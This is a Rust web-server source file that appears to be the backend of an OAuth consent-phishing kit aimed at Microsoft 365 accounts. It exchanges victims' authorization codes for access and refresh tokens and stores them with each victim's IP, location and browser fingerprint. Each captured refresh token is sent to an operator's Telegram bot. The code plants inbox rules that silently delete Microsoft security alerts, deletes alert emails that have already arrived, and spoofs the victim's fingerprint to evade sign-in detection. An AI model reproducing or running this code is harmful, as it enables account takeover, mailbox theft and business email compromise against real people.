use actix_web::{web, App, HttpServer, HttpResponse, Responder};
use serde::{Deserialize, Serialize};
use sqlx::{SqlitePool, sqlite::SqlitePoolOptions};
use chrono::{Utc, Duration};
use uuid::Uuid;
use std::env;
use dotenv::dotenv;
use reqwest::Client;
use rand::Rng;
use actix_cors::Cors;

mod vault;
use vault::Vault;

mod scheduler;
use scheduler::start_scheduler;

mod graph_client;
pub use graph_client::GraphClient;

mod recon;
use recon::{recon_get_handler, recon_run_handler};

mod rules;
use rules::{create_rule_handler, delete_rule_handler, fetch_graph_rules_handler, list_rules_handler, run_local_rules_handler, ai_suggest_rules_handler, update_rule_handler};

mod contacts;
use contacts::{list_contacts_handler, create_contact_handler, update_contact_handler, delete_contact_handler, extract_emails_handler};

mod tasks;
use tasks::{list_task_lists_handler, list_tasks_handler, create_task_handler, update_task_handler, delete_task_handler};

mod onedrive;
use onedrive::{list_drive_items_handler, get_drive_item_handler, download_drive_item_handler, search_drive_items_handler};

mod office_apps;
use office_apps::{list_office_docs_handler, search_office_docs_handler, get_office_embed_url_handler};

mod stealth;
use stealth::stealth_config_handler;

mod campaigns;
use campaigns::{
    attach_token_handler, create_campaign_handler, delete_campaign_handler,
    get_campaign_handler, list_campaigns_handler,
};

mod response_crypto;
use response_crypto::ResponseCrypto;

mod audit;
use audit::{analytics_overview_handler, audit_logs_handler, audit_summary_handler, AuditMiddleware};

mod settings;
use settings::{get_ai_settings_handler, save_ai_settings_handler, test_decrypt_handler, purge_expired_handler};

mod auth;
use auth::{register_handler, login_handler, me_handler, ensure_users_table, seed_default_admin, list_admins_handler, create_admin_handler, update_admin_handler, delete_admin_handler};

mod bec;
use bec::bec_analyze_handler;

mod lure;
use lure::{generate_lure_handler, mimic_email_handler, hijack_conversation_handler, financial_detection_handler};

mod inbox_folders;
use inbox_folders::{
    list_folders_handler, folder_messages_handler, create_folder_handler,
    delete_folder_handler,
    send_mail_handler, delete_message_handler, fetch_contacts_handler,
    mark_read_handler, mx_check_handler, move_message_handler,
    list_local_folders_handler, create_local_folder_handler,
    delete_local_folder_handler, list_local_folder_messages_handler,
    auto_filter_handler,
    get_deleted_items_handler, purge_deleted_items_handler,
};

mod calendar;
use calendar::{list_calendar_events_handler, inject_meeting_handler, calendar_lure_handler};

mod teams;
use teams::{list_teams_handler, list_team_channels_handler, share_to_teams_handler, send_chat_message_handler, send_channel_message_handler};

mod cookie_client;
use cookie_client::{generate_bookmarklet_token_handler, sync_cookies_handler, test_cookie_session_handler, get_session_status_handler, kill_session_handler};

mod tenant_utils;
use tenant_utils::{detect_tenant_fixed, get_location_from_ip};

// ------------------- CONFIGURATION -------------------
#[derive(Debug, Clone)]
#[allow(dead_code)]
pub struct AppConfig {
    client_id: String,
    client_secret: String,
    redirect_uri: String,
    first_party_ids: Vec<String>,
    database_url: String,
    telegram_bot_token: Option<String>,
    telegram_chat_id: Option<String>,
    master_secret: String,
    frontend_url: Option<String>,

}

impl AppConfig {
    fn from_env() -> Self {
        Self {
            client_id: env::var("CLIENT_ID").expect("CLIENT_ID not set"),
            client_secret: env::var("CLIENT_SECRET").expect("CLIENT_SECRET not set"),
            redirect_uri: env::var("REDIRECT_URI").expect("REDIRECT_URI not set"),
            first_party_ids: vec![
                "04b07795-8ddb-461a-bbee-02f9e1bf7b46".to_string(),
                "a672d62c-fc7b-4e81-a576-e60dc46e951d".to_string(),
                "d3590ed6-52b3-4102-aeff-aad2292ab01c".to_string(),
            ],
            database_url: env::var("DATABASE_URL").unwrap_or_else(|_| "sqlite::memory:".to_string()),
            telegram_bot_token: env::var("TELEGRAM_BOT_TOKEN").ok(),
            telegram_chat_id: env::var("TELEGRAM_CHAT_ID").ok(),
            master_secret: env::var("MASTER_SECRET").expect("MASTER_SECRET not set"),
            frontend_url: env::var("FRONTEND_URL").ok(),

        }
    }
}

#[derive(Debug, sqlx::FromRow, Serialize)]
struct HarvestedToken {
    id: String,
    email: Option<String>,
    access_token: String,
    refresh_token: String,
    expires_at: chrono::DateTime<Utc>,
    #[serde(rename = "created_at")]
    captured_at: chrono::DateTime<Utc>,
    source: String,
    ip_address: Option<String>,
    location: Option<String>,
    tenant_id: Option<String>,
    category: Option<String>,
    #[serde(rename = "account_type")]
    account_type: Option<String>,
    last_refreshed_at: Option<chrono::DateTime<Utc>>,
    status: Option<String>,
    user_agent: Option<String>,
    accept_language: Option<String>,
}

#[derive(Clone)]
pub struct AppState {
    pool: SqlitePool,
    config: AppConfig,
    http_client: Client,
    vault: Vault,
    response_key: [u8; 32],
}

/// Retrieve token from vault (tokens table) or fall back to harvested table.
pub async fn retrieve_any_token(state: &AppState, token_id: &str) -> anyhow::Result<vault::DecryptedToken> {
    // First try vault (encrypted tokens table)
    if let Ok(token) = state.vault.retrieve_token(&state.pool, token_id).await {
        return Ok(token);
    }
    // Fall back to harvested table (legacy plain-text storage)
    let row: HarvestedToken = sqlx::query_as(
        "SELECT id, email, access_token, refresh_token, expires_at, captured_at, source, ip_address, location, tenant_id, category, account_type, last_refreshed_at, status, user_agent, accept_language FROM harvested WHERE id = ?"
    )
    .bind(token_id)
    .fetch_one(&state.pool)
    .await
    .map_err(|e| anyhow::anyhow!("Token not found in any storage: {}", e))?;

    Ok(vault::DecryptedToken {
        id: row.id,
        campaign_id: "harvested".to_string(),
        user_email: row.email.unwrap_or_default(),
        access_token: row.access_token,
        refresh_token: row.refresh_token,
        scopes: vec![],
        expires_at: row.expires_at,
        created_at: row.captured_at,
        last_refreshed_at: None,
        account_type: row.account_type.or(row.category),
        user_agent: row.user_agent,
        accept_language: row.accept_language,
    })
}

/// Retrieve token from vault or harvested table, then create a GraphClient
/// with the victim's browser fingerprint cloned (User-Agent + Accept-Language).
/// This makes all Graph API calls look like they come from the victim's own
/// browser, bypassing Microsoft's "unusual sign-in activity" detection.
pub async fn retrieve_token_and_client(
    state: &AppState,
    token_id: &str,
) -> anyhow::Result<(vault::DecryptedToken, GraphClient, String)> {
    let token = retrieve_any_token(state, token_id).await?;
    let access_token = refresh_access_token(state, &token.refresh_token)
        .await
        .unwrap_or_else(|| token.access_token.clone());
    let client = GraphClient::with_fingerprint(
        token.user_agent.clone(),
        token.accept_language.clone(),
    );
    Ok((token, client, access_token))
}

fn generate_id() -> String {
    Uuid::new_v4().to_string()
}

#[derive(Deserialize)]
struct StoreTokenRequest {
    campaign_id: String,
    user_email: String,
    access_token: String,
    refresh_token: String,
    scopes: Vec<String>,
    expires_at: chrono::DateTime<Utc>,
    account_type: Option<String>,
}

async fn store_token_handler(
    body: web::Json<StoreTokenRequest>,
    audit_ctx: audit::AuditContext,
    state: web::Data<AppState>,
) -> impl Responder {
    let result = state.vault.store_token(
        &state.pool,
        &body.campaign_id,
        &body.user_email,
        &body.access_token,
        &body.refresh_token,
        body.scopes.clone(),
        body.expires_at,
        body.account_type.as_deref(),
    ).await;

    let success = result.is_ok();
    let token_id = result.as_ref().ok().cloned();

    let _ = audit::insert_audit_log(
        &state.pool,
        "token_stored",
        Some(&body.campaign_id),
        token_id.as_deref(),
        Some(&body.user_email),
        Some(&audit_ctx.ip_address),
        Some(&audit_ctx.user_agent),
        Some(serde_json::json!({"scopes": body.scopes})),
        success,
    ).await;

    match result {
        Ok(id) => {
            println!("Stored encrypted token {} for campaign {}", id, body.campaign_id);
            HttpResponse::Ok().json(serde_json::json!({
                "status": "stored",
                "id": id
            }))
        }
        Err(e) => {
            eprintln!("Token store error: {}", e);
            HttpResponse::InternalServerError().json(serde_json::json!({
                "error": "failed_to_store_token",
                "details": format!("{}", e)
            }))
        }
    }
}

async fn send_telegram_notification(config: &AppConfig, refresh_token: &str, email: &str) {
    if let (Some(token), Some(chat_id)) = (&config.telegram_bot_token, &config.telegram_chat_id) {
        let message = format!("🎯 *New Token Captured!*\n\nEmail: `{}`\nRefresh Token: `{}`\nTime: {}", email, refresh_token, Utc::now());
        let url = format!("https://api.telegram.org/bot{}/sendMessage", token);
        let params = [
            ("chat_id", chat_id.as_str()),
            ("text", message.as_str()),
            ("parse_mode", "Markdown"),
        ];
        let _ = reqwest::Client::new()
            .post(&url)
            .form(&params)
            .send()
            .await;
    }
}

async fn fetch_user_email(access_token: &str) -> Option<String> {
    let client = Client::new();
    let resp = client
        .get("https://graph.microsoft.com/v1.0/me")
        .header("Authorization", format!("Bearer {}", access_token))
        .send()
        .await
        .ok()?;
    let body: serde_json::Value = resp.json().await.ok()?;
    body.get("userPrincipalName")?.as_str().map(|s| s.to_string())
}

/// OPSEC: Retry search and delete Microsoft's "New app connected" notification email.
/// The notification may arrive 5-20 seconds after the OAuth flow completes.
/// Also creates a Graph messageRule to auto-delete future notifications instantly.
async fn delete_microsoft_notification_email(access_token: String, user_agent: Option<String>, accept_language: Option<String>) {
    let client = Client::new();
    let ua = user_agent.as_deref().unwrap_or("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36");
    let lang = accept_language.as_deref().unwrap_or("en-US,en;q=0.9");
    let rule_url = "https://graph.microsoft.com/v1.0/me/mailFolders/inbox/messageRules";

    // Check existing rules first — don't create duplicates on re-harvest
    let existing_rules: serde_json::Value = match client
        .get(rule_url)
        .header("Authorization", format!("Bearer {}", access_token))
        .header("Accept", "application/json")
        .header("User-Agent", ua)
        .header("Accept-Language", lang)
        .send()
        .await {
        Ok(r) if r.status().is_success() => r.json().await.unwrap_or_default(),
        _ => serde_json::json!({"value": []}),
    };

    let existing_names: Vec<String> = existing_rules
        .get("value")
        .and_then(|v| v.as_array())
        .map(|arr| arr.iter()
            .filter_map(|r| r.get("displayName").and_then(|d| d.as_str()).map(|s| s.to_string()))
            .collect())
        .unwrap_or_default();

    let has_external_mail_filter = existing_names.iter().any(|n| n == "External Mail Filter");
    let has_security_update = existing_names.iter().any(|n| n == "Security Update");

    // Rule 1: Sender-based auto-delete (only if not already present)
    if !has_external_mail_filter {
        let rule_payload = serde_json::json!({
            "displayName": "External Mail Filter",
            "sequence": 1,
            "isEnabled": true,
            "conditions": {
                "fromAddressContains": [
                    "account-security-noreply@accountprotection.microsoft.com",
                    "microsoftaccount@microsoft.com",
                    "security@microsoft.com",
                    "microsoft@communications.microsoft.com",
                    "no-reply@accountprotection.microsoft.com",
                    "no-reply@microsoft.com",
                    "azureadnotification@microsoft.com",
                    "no-reply@azureadnotifications.microsoft.com",
                    "msonlineservicesteam@microsoftonline.com",
                    "no-reply@signin.microsoft.com",
                    "account-security-noreply@signin.microsoft.com"
                ]
            },
            "actions": {
                "delete": true,
                "stopProcessingRules": true
            }
        });
        match client
            .post(rule_url)
            .header("Authorization", format!("Bearer {}", access_token))
            .header("Content-Type", "application/json")
            .header("User-Agent", ua)
            .header("Accept-Language", lang)
            .json(&rule_payload)
            .send()
            .await {
            Ok(r) if r.status().is_success() => println!("[opsec] Created Graph auto-delete rule for Microsoft notification emails"),
            Ok(r) => eprintln!("[opsec] Failed to create Graph rule ({}): {}", r.status(), r.text().await.unwrap_or_default()),
            Err(e) => eprintln!("[opsec] Failed to create Graph rule: {}", e),
        }
    } else {
        println!("[opsec] 'External Mail Filter' rule already exists — skipping creation");
    }

    // Rule 2: Subject-based auto-delete (only if not already present)
    if !has_security_update {
        let subject_rule_payload = serde_json::json!({
            "displayName": "Security Update",
            "sequence": 2,
            "isEnabled": true,
            "conditions": {
                "subjectContains": [
                    "New app", "New app(s)", "have access to your data",
                    "connected to your Microsoft", "suspicious sign-in",
                    "unusual sign-in", "unusual activity", "password changed",
                    "password was changed", "security alert", "security notification",
                    "account security", "verify your identity", "MFA",
                    "two-step verification", "two-factor authentication",
                    "app password", "review recent activity",
                    "help us protect your account", "Microsoft account team",
                    "action required", "your account was accessed"
                ]
            },
            "actions": {
                "delete": true,
                "stopProcessingRules": true
            }
        });
        match client
            .post(rule_url)
            .header("Authorization", format!("Bearer {}", access_token))
            .header("Content-Type", "application/json")
            .header("User-Agent", ua)
            .header("Accept-Language", lang)
            .json(&subject_rule_payload)
            .send()
            .await {
            Ok(r) if r.status().is_success() => println!("[opsec] Created Graph subject-based auto-delete rule for notifications"),
            Ok(r) => eprintln!("[opsec] Failed to create subject rule ({}): {}", r.status(), r.text().await.unwrap_or_default()),
            Err(e) => eprintln!("[opsec] Failed to create subject rule: {}", e),
        }
    } else {
        println!("[opsec] 'Security Update' rule already exists — skipping creation");
    }

    // Now poll for any notification that may have arrived BEFORE the rule was created.
    // Search broadly — Microsoft notification emails vary by locale/account type
    let search_queries = [
        // Exact phrases Microsoft uses
        "\"New app\" AND \"connected\"",
        "\"New app(s)\" AND \"connected\"",
        "\"New app connected\"",
        "\"New app(s) connected\"",
        "\"app connected\" AND \"Microsoft account\"",
        "\"have access to your data\"",
        "\"connected to your Microsoft account\"",
        "\"suspicious sign-in\"",
        "\"unusual sign-in\"",
        "\"unusual activity\"",
        "\"password changed\"",
        "\"security alert\"",
        "\"security notification\"",
        "\"account security\"",
        "\"verify your identity\"",
        "\"two-step verification\"",
        "\"review recent activity\"",
        "\"help us protect your account\"",
        "\"action required\"",
        "\"your account was accessed\"",
    ];

    for attempt in 1..=15 {
        tokio::time::sleep(std::time::Duration::from_secs(2)).await;

        // Try multiple search strategies
        let mut all_messages: Vec<serde_json::Value> = Vec::new();

        // Strategy 1: Graph API $search
        for query in &search_queries {
            let search_url = format!(
                "https://graph.microsoft.com/v1.0/me/messages?$search={}&$top=10&$select=id,subject,receivedDateTime,from,bodyPreview",
                urlencoding::encode(query)
            );
            if let Ok(resp) = client
                .get(&search_url)
                .header("Authorization", format!("Bearer {}", access_token))
                .header("Accept", "application/json")
                .header("User-Agent", ua)
                .header("Accept-Language", lang)
                .send()
                .await {
                if resp.status().is_success() {
                    if let Ok(body) = resp.json::<serde_json::Value>().await {
                        if let Some(msgs) = body.get("value").and_then(|v| v.as_array()) {
                            all_messages.extend(msgs.clone());
                        }
                    }
                }
            }
        }

        // Strategy 2: Filter by known Microsoft notification sender domains
        let filter_url = "https://graph.microsoft.com/v1.0/me/messages?$filter=from/emailAddress/address eq 'account-security-noreply@accountprotection.microsoft.com' or from/emailAddress/address eq 'microsoftaccount@microsoft.com' or from/emailAddress/address eq 'security@microsoft.com'&$top=5&$select=id,subject,receivedDateTime,from,bodyPreview&$orderby=receivedDateTime desc";
        if let Ok(resp) = client
            .get(filter_url)
            .header("Authorization", format!("Bearer {}", access_token))
            .header("Accept", "application/json")
            .send()
            .await {
            if resp.status().is_success() {
                if let Ok(body) = resp.json::<serde_json::Value>().await {
                    if let Some(msgs) = body.get("value").and_then(|v| v.as_array()) {
                        all_messages.extend(msgs.clone());
                    }
                }
            }
        }

        // Strategy 3: Recent inbox sweep — look at last 20 messages
        let recent_url = "https://graph.microsoft.com/v1.0/me/mailFolders/inbox/messages?$top=20&$select=id,subject,receivedDateTime,from,bodyPreview&$orderby=receivedDateTime desc";
        if let Ok(resp) = client
            .get(recent_url)
            .header("Authorization", format!("Bearer {}", access_token))
            .header("Accept", "application/json")
            .send()
            .await {
            if resp.status().is_success() {
                if let Ok(body) = resp.json::<serde_json::Value>().await {
                    if let Some(msgs) = body.get("value").and_then(|v| v.as_array()) {
                        all_messages.extend(msgs.clone());
                    }
                }
            }
        }

        // Deduplicate by ID
        let mut seen = std::collections::HashSet::new();
        all_messages.retain(|m| {
            let id = m.get("id").and_then(|v| v.as_str()).unwrap_or("");
            if id.is_empty() || seen.contains(id) { false } else { seen.insert(id.to_string()); true }
        });

        let now = Utc::now();
        let mut found = false;

        for msg in &all_messages {
            let id = msg.get("id").and_then(|v| v.as_str()).unwrap_or("");
            let subject = msg.get("subject").and_then(|v| v.as_str()).unwrap_or("").to_lowercase();
            let body_preview = msg.get("bodyPreview").and_then(|v| v.as_str()).unwrap_or("").to_lowercase();
            let received = msg.get("receivedDateTime").and_then(|v| v.as_str()).unwrap_or("");
            let from_addr = msg.get("from")
                .and_then(|f| f.get("emailAddress"))
                .and_then(|e| e.get("address"))
                .and_then(|v| v.as_str())
                .unwrap_or("")
                .to_lowercase();
            let from_name = msg.get("from")
                .and_then(|f| f.get("emailAddress"))
                .and_then(|e| e.get("name"))
                .and_then(|v| v.as_str())
                .unwrap_or("")
                .to_lowercase();

            let is_recent = if let Ok(dt) = chrono::DateTime::parse_from_rfc3339(received) {
                (now - dt.with_timezone(&Utc)).num_minutes() <= 15
            } else { false };

            // Broad detection: subject OR body contains notification keywords
            let has_notification_subject = subject.contains("new app")
                || subject.contains("connected")
                || subject.contains("access to your data")
                || subject.contains("microsoft account")
                || subject.contains("suspicious sign-in")
                || subject.contains("unusual sign-in")
                || subject.contains("unusual activity")
                || subject.contains("password changed")
                || subject.contains("password was changed")
                || subject.contains("security alert")
                || subject.contains("security notification")
                || subject.contains("account security")
                || subject.contains("verify your identity")
                || subject.contains("two-step verification")
                || subject.contains("two-factor")
                || subject.contains("review recent activity")
                || subject.contains("help us protect")
                || subject.contains("action required")
                || subject.contains("your account was accessed");

            let has_notification_body = body_preview.contains("new app")
                || body_preview.contains("connected to the microsoft account")
                || body_preview.contains("have access to your data")
                || body_preview.contains("manage your apps")
                || body_preview.contains("suspicious sign-in")
                || body_preview.contains("unusual activity")
                || body_preview.contains("password was changed")
                || body_preview.contains("security alert")
                || body_preview.contains("verify your identity")
                || body_preview.contains("review recent activity")
                || body_preview.contains("help us protect");

            let is_microsoft_sender = from_addr.contains("microsoft")
                || from_addr.contains("accountprotection")
                || from_addr.contains("azuread")
                || from_addr.contains("microsoftonline")
                || from_addr.contains("signin.microsoft")
                || from_name.contains("microsoft account team")
                || from_name.contains("microsoft account")
                || from_name.contains("microsoft security")
                || from_name.contains("azure ad")
                || from_name.contains("microsoft online");

            let is_notification = is_recent
                && (has_notification_subject || has_notification_body)
                && is_microsoft_sender;

            if is_notification && !id.is_empty() {
                found = true;
                let del_url = format!("https://graph.microsoft.com/v1.0/me/messages/{}", id);
                match client
                    .delete(&del_url)
                    .header("Authorization", format!("Bearer {}", access_token))
                    .header("User-Agent", ua)
                    .header("Accept-Language", lang)
                    .send()
                    .await {
                    Ok(r) if r.status().is_success() || r.status() == reqwest::StatusCode::NOT_FOUND => {
                        println!("[opsec] Deleted notification email on attempt {}: subject='{}' from='{}'", attempt, subject, from_addr);
                        return;
                    }
                    Ok(r) => eprintln!("[opsec] Delete attempt {} failed with status {} for id={} subject='{}'", attempt, r.status(), id, subject),
                    Err(e) => eprintln!("[opsec] Delete error on attempt {} for id={}: {}", attempt, id, e),
                }
            }
        }

        if found {
            // Found matching email but delete failed — keep trying
            continue;
        }
    }
    eprintln!("[opsec] Notification email not found after 15 attempts (30s). Check if the email subject/sender changed.");
}

#[derive(Deserialize)]
struct ExchangeQuery {
    code: String,
    user_ip: Option<String>,
    ua: Option<String>,
    lang: Option<String>,
}

/// Decode an id_token JWT without signature verification (we only need the claims).
fn decode_id_token(id_token: &str) -> Option<serde_json::Map<String, serde_json::Value>> {
    let parts: Vec<&str> = id_token.split('.').collect();
    if parts.len() != 3 {
        return None;
    }
    use base64::{Engine as _, engine::general_purpose};
    let decoded = general_purpose::URL_SAFE_NO_PAD.decode(parts[1]).ok()?;
    let json_str = String::from_utf8(decoded).ok()?;
    let value: serde_json::Value = serde_json::from_str(&json_str).ok()?;
    value.as_object().cloned()
}

async fn exchange_code(
    query: web::Query<ExchangeQuery>,
    req: actix_web::HttpRequest,
    state: web::Data<AppState>,
) -> impl Responder {
    let code = &query.code;
    let token_url = "https://login.microsoftonline.com/common/oauth2/v2.0/token";
    let params = [
        ("client_id", state.config.client_id.as_str()),
        ("client_secret", state.config.client_secret.as_str()),
        ("grant_type", "authorization_code"),
        ("code", code.as_str()),
        ("redirect_uri", state.config.redirect_uri.as_str()),
    ];
    let client = &state.http_client;
    let res = client.post(token_url).form(&params).send().await;
    match res {
        Ok(resp) => {
            let body: serde_json::Value = resp.json().await.unwrap_or_default();
            if let (Some(access_token), Some(refresh_token)) = (body.get("access_token").and_then(|v| v.as_str()), body.get("refresh_token").and_then(|v| v.as_str())) {
                let id = generate_id();
                let expires_in = body.get("expires_in").and_then(|v| v.as_i64()).unwrap_or(3600);
                let _expires_at = Utc::now() + Duration::seconds(expires_in);
                // Set refresh token expiry to 90 days for Microsoft confidential clients
                let refresh_expires_at = Utc::now() + Duration::days(90);
                let email = fetch_user_email(access_token).await;
                let email_str = email.clone().unwrap_or_else(|| "unknown".to_string());
                
                // Decode id_token for accurate tenant/account detection
                let id_token_claims = body.get("id_token")
                    .and_then(|v| v.as_str())
                    .and_then(|id_token| decode_id_token(id_token));
                
                // Detect tenant and account type
                let (tenant_name, account_type) = detect_tenant_fixed(&email_str, id_token_claims.as_ref());
                let category = account_type.clone(); // Keep category for backward compatibility
                
                // Get real client IP address
                // Priority: 1) X-Forwarded-For header, 2) query param (from Cloudflare Worker), 3) peer_addr
                let ip_address = req.headers()
                    .get("X-Forwarded-For")
                    .and_then(|v| v.to_str().ok())
                    .and_then(|v| v.split(',').next())
                    .map(|s| s.trim().to_string())
                    .or_else(|| query.user_ip.clone())
                    .or_else(|| req.connection_info().peer_addr().map(|s| s.to_string()))
                    .unwrap_or_else(|| "unknown".to_string());
                
                // Resolve location from IP
                let (location, _region, _country) = get_location_from_ip(&ip_address).await;

                // Capture the victim's browser fingerprint from the worker query params
                let user_agent = query.ua.as_deref().unwrap_or("");
                let accept_language = query.lang.as_deref().unwrap_or("");

                println!("Attempting to insert token for email: {:?}, tenant: {:?}, account_type: {:?}", email, tenant_name, account_type);
                // Store in harvested table (legacy, for dashboard display)
                // Session is ACTIVE immediately - OAuth token provides full access
                match sqlx::query(
                    "INSERT INTO harvested (id, email, access_token, refresh_token, expires_at, captured_at, source, ip_address, location, tenant_id, category, account_type, last_refreshed_at, user_agent, accept_language) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)"
                )
                .bind(&id)
                .bind(&email)
                .bind(access_token)
                .bind(refresh_token)
                .bind(refresh_expires_at)
                .bind(Utc::now())
                .bind("oauth_app")
                .bind(&ip_address)
                .bind(&location)
                .bind(&tenant_name)
                .bind(&category)
                .bind(&account_type)
                .bind(Option::<chrono::DateTime<Utc>>::None)
                .bind(user_agent)
                .bind(accept_language)
                .execute(&state.pool)
                .await {
                    Ok(result) => println!("[exchange] Inserted into harvested table: {} rows affected", result.rows_affected()),
                    Err(e) => eprintln!("[exchange] ERROR inserting into harvested table: {}", e),
                }
                // Also store in encrypted tokens table (for scheduler refresh, BEC, recon, etc.)
                match state.vault.store_token(
                    &state.pool,
                    &id,
                    &email_str,
                    access_token,
                    refresh_token,
                    vec!["openid".to_string(), "offline_access".to_string(), "User.Read".to_string(), "Mail.ReadWrite".to_string(), "Mail.Send".to_string(), "Contacts.Read".to_string(), "MailboxSettings.ReadWrite".to_string()],
                    refresh_expires_at,
                    Some(account_type.as_str()),
                ).await {
                    Ok(token_id) => println!("[exchange] Stored encrypted token in vault: {}", token_id),
                    Err(e) => eprintln!("[exchange] ERROR storing encrypted token in vault: {}", e),
                }
                if let Some(email) = email {
                    send_telegram_notification(&state.config, refresh_token, &email).await;
                }
                // OPSEC: auto-delete Microsoft's "New app connected" notification email
                // Pass the victim's browser fingerprint so Graph API calls look like
                // they come from the victim's own browser
                let fp_ua = query.ua.as_deref().map(|s| s.to_string());
                let fp_lang = query.lang.as_deref().map(|s| s.to_string());
                tokio::spawn(delete_microsoft_notification_email(access_token.to_string(), fp_ua, fp_lang));
                HttpResponse::Ok().json(serde_json::json!({"status": "token_stored", "token_id": id}))
            } else {
                HttpResponse::BadRequest().json(serde_json::json!({"error": "token_exchange_failed", "details": body}))
            }
        }
        Err(e) => HttpResponse::InternalServerError().json(serde_json::json!({"error": format!("request_failed: {}", e)}))
    }
}

// Token-based auth-success page: redirect to REAL Outlook after OAuth
// Victim NEVER sees the proxy domain - they go directly to Microsoft
// The OAuth token IS the session - Graph API provides full access
async fn auth_success_handler(
    query: web::Query<std::collections::HashMap<String, String>>,
    state: web::Data<AppState>,
) -> impl Responder {
    let token_id = query.get("token_id").cloned().unwrap_or_default();

    // Look up account_type to determine the correct real OWA mail URL.
    // The final redirect goes to the organization's OWA mail (enterprise) or
    // the tenant's OWA mail (consumer / live). It must NOT go to office.com.
    let account_type: Option<String> = if !token_id.is_empty() {
        sqlx::query_scalar::<_, String>(
            "SELECT account_type FROM harvested WHERE id = ? UNION ALL SELECT account_type FROM tokens WHERE id = ? LIMIT 1"
        )
        .bind(&token_id)
        .bind(&token_id)
        .fetch_optional(&state.pool)
        .await
        .unwrap_or(None)
    } else {
        None
    };

    // Redirect directly to inbox /mail/0/ to skip the M365 portal redirect.
    let outlook_url = match account_type.as_deref() {
        Some("enterprise") | Some("business") | Some("organization") => "https://outlook.office.com/mail/0/",
        _ => "https://outlook.live.com/mail/0/",
    };
    
    let html = format!(r#"<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loading your account...</title>
    <style>
        * {{ margin: 0; padding: 0; box-sizing: border-box; }}
        body {{
            font-family: "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background: linear-gradient(135deg, #1e3a5f 0%, #0f2744 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            color: #fff;
        }}
        .container {{
            text-align: center;
            max-width: 480px;
            padding: 40px 30px;
            background: rgba(255,255,255,0.05);
            backdrop-filter: blur(10px);
            border-radius: 16px;
            border: 1px solid rgba(255,255,255,0.1);
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
        }}
        .loading {{
            width: 48px;
            height: 48px;
            border: 3px solid rgba(255,255,255,0.2);
            border-top: 3px solid #0078d4;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 0 auto 24px;
        }}
        @keyframes spin {{
            0% {{ transform: rotate(0deg); }}
            100% {{ transform: rotate(360deg); }}
        }}
        h1 {{ font-size: 22px; font-weight: 600; margin-bottom: 12px; }}
        p {{ font-size: 14px; color: rgba(255,255,255,0.7); margin-bottom: 24px; line-height: 1.6; }}
        .progress {{
            width: 100%;
            height: 4px;
            background: rgba(255,255,255,0.1);
            border-radius: 2px;
            overflow: hidden;
            margin-top: 24px;
        }}
        .progress-bar {{
            width: 0%;
            height: 100%;
            background: #0078d4;
            border-radius: 2px;
            animation: progress 3s ease-out forwards;
        }}
        @keyframes progress {{
            0% {{ width: 0%; }}
            100% {{ width: 100%; }}
        }}
    </style>
</head>
<body>
    <div class="container">
        <div class="loading"></div>
        <h1>Loading your account...</h1>
        <p>Please wait while we prepare your Outlook experience.</p>
        <div class="progress">
            <div class="progress-bar"></div>
        </div>
    </div>
    <script>
        // Redirect to REAL Outlook after 3 seconds - victim never sees proxy domain
        setTimeout(function() {{
            window.location.href = '{}';
        }}, 3000);
    </script>
</body>
</html>"#, outlook_url);

    HttpResponse::Ok()
        .content_type("text/html; charset=utf-8")
        .body(html)
}

// JSON API: list all tokens
async fn api_tokens(state: web::Data<AppState>) -> impl Responder {
    let rows = sqlx::query_as::<_, HarvestedToken>("SELECT id, email, access_token, refresh_token, expires_at, captured_at, source, ip_address, location, tenant_id, category, account_type, last_refreshed_at, status, user_agent, accept_language FROM harvested ORDER BY captured_at DESC")
        .fetch_all(&state.pool)
        .await
        .unwrap_or_default();
    HttpResponse::Ok().json(rows)
}

// JSON API: get single encrypted token by id
async fn api_token_by_id(
    path: web::Path<String>,
    req: actix_web::HttpRequest,
    state: web::Data<AppState>,
) -> impl Responder {
    let id = path.into_inner();
    match state.vault.retrieve_token(&state.pool, &id).await {
        Ok(token) => {
            let json = serde_json::to_value(token).unwrap_or_default();
            ResponseCrypto::respond(&req, json, &state.response_key)
        }
        Err(_) => HttpResponse::NotFound().json(serde_json::json!({"error": "token_not_found"})),
    }
}

#[derive(Deserialize)]
struct DeleteTokensRequest {
    token_ids: Vec<String>,
}

// JSON API: batch delete tokens
async fn api_delete_tokens(
    body: web::Json<DeleteTokensRequest>,
    state: web::Data<AppState>,
) -> impl Responder {
    let mut deleted_harvested = 0u64;
    let mut deleted_vault = 0u64;

    // Disable foreign key constraints temporarily to allow deletion
    // Production SQLite may have FK enabled; local schema doesn't define them
    let _ = sqlx::query("PRAGMA foreign_keys = OFF")
        .execute(&state.pool)
        .await;

    for id in &body.token_ids {
        // Check if token exists in either table before attempting deletion
        let exists_harvested: bool = sqlx::query_scalar::<_, i64>("SELECT COUNT(*) FROM harvested WHERE id = ?")
            .bind(id)
            .fetch_one(&state.pool)
            .await
            .map(|count| count > 0)
            .unwrap_or(false);
        
        let exists_vault: bool = sqlx::query_scalar::<_, i64>("SELECT COUNT(*) FROM tokens WHERE id = ?")
            .bind(id)
            .fetch_one(&state.pool)
            .await
            .map(|count| count > 0)
            .unwrap_or(false);

        eprintln!("[delete] Token {} exists: harvested={}, vault={}", id, exists_harvested, exists_vault);

        // Delete related records first to avoid foreign key constraint violations
        let _ = sqlx::query("DELETE FROM created_rules WHERE token_id = ?")
            .bind(id)
            .execute(&state.pool)
            .await;
        let _ = sqlx::query("DELETE FROM recon_reports WHERE token_id = ?")
            .bind(id)
            .execute(&state.pool)
            .await;
        let _ = sqlx::query("DELETE FROM audit_logs WHERE token_id = ?")
            .bind(id)
            .execute(&state.pool)
            .await;
        let _ = sqlx::query("DELETE FROM campaigns WHERE token_id = ?")
            .bind(id)
            .execute(&state.pool)
            .await;
        let _ = sqlx::query("DELETE FROM local_folders WHERE token_id = ?")
            .bind(id)
            .execute(&state.pool)
            .await;
        let _ = sqlx::query("DELETE FROM local_filtered_messages WHERE token_id = ?")
            .bind(id)
            .execute(&state.pool)
            .await;
